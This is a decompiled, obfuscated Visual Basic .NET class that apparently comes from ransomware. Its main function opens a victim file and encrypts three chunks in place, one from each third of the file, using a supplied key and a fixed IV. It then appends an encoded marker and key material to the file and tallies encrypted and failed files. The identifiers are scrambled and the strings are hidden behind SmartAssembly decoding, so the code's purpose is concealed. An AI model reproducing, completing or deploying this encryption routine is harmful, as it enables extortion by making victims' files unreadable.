Imports System
Imports System.IO
Imports System.Text
Imports oFbodOYJTt
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000021 RID: 33
	Friend NotInheritable Class dsNajfALrLtCLf
		' Token: 0x060000D6 RID: 214 RVA: 0x0000F1FC File Offset: 0x0000D3FC
		Public Shared Function sQtvooBwdOBCxEbJ(long_0 As Long) As Integer
			Return CInt(long_0)
		End Function

		' Token: 0x060000D7 RID: 215 RVA: 0x0000F210 File Offset: 0x0000D410
		Public Shared Function PPfLKlDWqkz(HZYgReqeZdwiOhP As String, FggDlgbNzlN As String, swyyhWDxghLYiaP As String, Optional AJmlkCccFa As Byte() = Nothing) As Boolean
			Dim flag As Boolean
			Try
				Using fileStream As FileStream = New FileStream(HZYgReqeZdwiOhP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
					Dim num As Integer = dsNajfALrLtCLf.sQtvooBwdOBCxEbJ(fileStream.Length) / 3
					If num < 0 Then
						num *= -1
					End If
					Dim num2 As Integer = 0
					Try
						num2 = Convert.ToInt32(FggDlgbNzlN) * Convert.ToInt32(fileStream.Length) / 100 / 2
						If num2 < 0 Then
							num2 *= -1
						End If
					Catch
						num2 = 107374182
					End Try
					If num <= num2 - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024 Then
						num2 = (num - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024) / 10
					End If
					Dim num3 As Integer = CInt(Math.Round(CDbl(num2) / CDbl(32F), MidpointRounding.AwayFromZero)) * 32
					For i As Integer = 0 To 3 - 1
						Dim array As Byte() = dsNajfALrLtCLf.ykfZNBAtxOgnLFR(HZYgReqeZdwiOhP, fileStream, num3, num * i)
						Dim array2 As Byte()
						If Not PFruJiQrcriiZ.VGKELVlTFUV Then
							array2 = fkozHCDTDrY.GVHcoGquozRzL(array, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
						Else
							array2 = RpWKlAyYXuFg.pUQagweWpoRi(array, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
						End If
						dsNajfALrLtCLf.VQKAMVLwiHQGq(HZYgReqeZdwiOhP, fileStream, array2, num * i)
					Next
				End Using
				Dim array3 As Byte()
				If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
					array3 = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107401329)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107401329)))
				Else
					array3 = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107401288)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.getString_0(107401288)))
				End If
				If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
					Using fileStream2 As FileStream = New FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						fileStream2.Write(array3, 0, array3.Length)
						GoTo IL_22F
					End Using
				End If
				Using fileStream3 As FileStream = New FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
					fileStream3.Write(AJmlkCccFa, 0, AJmlkCccFa.Length)
					fileStream3.Write(array3, 0, array3.Length)
				End Using
				IL_22F:
				GoTo IL_2B8
			Catch ex As Exception
				If PFruJiQrcriiZ.joesCNAxeHUI Then
					Try
						File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, String.Concat(New String() { dsNajfALrLtCLf.getString_0(107386581), HZYgReqeZdwiOhP, dsNajfALrLtCLf.getString_0(107399642), ex.Message, dsNajfALrLtCLf.getString_0(107396369) }))
					Catch ex2 As Exception
					End Try
				End If
				PFruJiQrcriiZ.iePhSHBTqLd += 1
				flag = False
			End Try
			Return flag
			IL_2B8:
			PFruJiQrcriiZ.XnicJWCgBOO += 1
			Return True
		End Function

		' Token: 0x060000D8 RID: 216 RVA: 0x0000F578 File Offset: 0x0000D778
		Public Shared Function ykfZNBAtxOgnLFR(EjwSrAUzZvKj As String, tHqOIEIJiPQebk As FileStream, QvcuhtejDQtivdh As Integer, Optional UPTryFWELOOWJHJY As Integer = 0) As Byte()
			Dim array As Byte() = New Byte(QvcuhtejDQtivdh - 1) {}
			tHqOIEIJiPQebk.Position = CLng(UPTryFWELOOWJHJY)
			tHqOIEIJiPQebk.Read(array, 0, QvcuhtejDQtivdh)
			Return array
		End Function

		' Token: 0x060000D9 RID: 217 RVA: 0x00002BA8 File Offset: 0x00000DA8
		Public Shared Sub VQKAMVLwiHQGq(jctFitMebkeNhNmQ As String, JbNawZzPFxlR As FileStream, yoyQQTyFZL As Byte(), Optional VgSuiJKECvkU As Integer = 0)
			JbNawZzPFxlR.Position = CLng(VgSuiJKECvkU)
			JbNawZzPFxlR.Write(yoyQQTyFZL, 0, yoyQQTyFZL.Length)
		End Sub

		' Token: 0x060000DB RID: 219 RVA: 0x00002BBD File Offset: 0x00000DBD
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(dsNajfALrLtCLf))
		End Sub

		' Token: 0x040000BE RID: 190
		<NonSerialized()>
		Friend Shared getString_0 As GetString
	End Class
End Namespace
